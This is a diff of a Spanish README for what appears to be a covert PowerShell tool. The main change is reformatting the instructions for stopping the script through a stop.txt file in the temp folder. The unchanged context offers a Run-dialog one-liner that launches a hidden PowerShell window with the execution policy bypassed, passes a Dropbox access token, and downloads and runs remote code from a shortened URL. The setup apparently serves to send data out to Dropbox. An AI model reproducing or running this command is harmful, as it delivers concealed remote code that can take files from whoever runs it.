@@ -176,14 +176,18 @@ Para ejecutar el script, utiliza el siguiente comando en el diálogo de "Ejecuta
 
 ```powershell
 powershell -w h -NoP -Ep Bypass $db='TU_TOKEN_DE_ACCESSO_DROPBOX';irm https://goo.su/xMXEjC | iex
-Asegúrate de reemplazar TU_TOKEN_DE_ACCESSO_DROPBOX con tu token de acceso real de Dropbox. Este comando ejecutará el script de manera oculta (-w h), sin restricciones de política de ejecución (-NoP -Ep Bypass), y cargará el script desde la URL proporcionada, ejecutándolo con el token de acceso de Dropbox que especificaste.
-Detener el Script
+Asegúrate de reemplazar TU_TOKEN_DE_ACCESSO_DROPBOX con tu token de acceso real de Dropbox.
 
+ Este comando ejecutará el script de manera oculta (-w h), sin restricciones de política de ejecución (-NoP -Ep Bypass), y cargará el script desde la URL proporcionada, ejecutándolo con el token de acceso de Dropbox que especificaste.
+
+## Detener la ejecución del script
 Para detener la ejecución del script, crea un archivo llamado stop.txt en la carpeta temporal ($env:TEMP) del usuario. El script comprobará la existencia de este archivo y se detendrá si lo encuentra.
 
 Puedes crear este archivo usando PowerShell con el siguiente comando:
-
+## COMANDO PARA CREAR EL ARCHIVO 
 New-Item -Path "$env:TEMP\stop.txt" -ItemType File
+## COMANDO PARA ELIMINAR EL ARCHIVO
+Remove-Item -Path "$env:TEMP\stop.txt" -Force
 Contribución
 
 Las contribuciones son bienvenidas. Por favor, realiza un fork del repositorio y envía un pull request con tus mejoras.
